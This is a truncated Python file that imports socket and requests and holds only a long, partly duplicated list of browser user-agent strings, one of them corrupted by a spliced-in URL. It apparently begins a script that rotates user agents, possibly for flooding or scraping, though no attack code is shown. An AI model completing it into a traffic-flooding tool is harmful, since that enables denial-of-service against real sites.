import socket, time, requests, random
useragents = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
